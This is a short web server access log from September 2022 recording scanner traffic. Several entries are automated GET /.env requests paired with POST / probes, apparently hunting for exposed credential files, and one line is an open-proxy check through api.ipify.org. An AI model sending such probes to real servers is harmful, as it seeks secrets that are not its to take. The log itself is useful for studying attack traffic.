95.214.235.205 - - [11/Sep/2022:19:46:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:19:46:05 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.136 - - [11/Sep/2022:20:03:20 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.246.189 - - [11/Sep/2022:20:44:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:20:44:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
41.92.185.208 - - [11/Sep/2022:20:47:59 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.77.149.3 - - [11/Sep/2022:20:49:30 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:21:15:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:21:15:10 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.20.69.98 - - [11/Sep/2022:21:26:58 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
198.20.69.98 - - [11/Sep/2022:21:26:58 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "-"
198.20.69.98 - - [11/Sep/2022:21:26:59 +0000] "GET /sitemap.xml HTTP/1.1" 404 196 "-" "-"
198.20.69.98 - - [11/Sep/2022:21:27:00 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 196 "-" "-"
198.20.69.98 - - [11/Sep/2022:21:27:03 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
130.211.54.158 - - [11/Sep/2022:21:32:05 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
135.125.246.189 - - [11/Sep/2022:22:46:07 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [11/Sep/2022:22:46:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:22:46:18 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [11/Sep/2022:22:46:18 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [11/Sep/2022:23:18:30 +0000] "GET http://api.ipify.org/?Z71860198950Q1 HTTP/1.1" 200 32 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
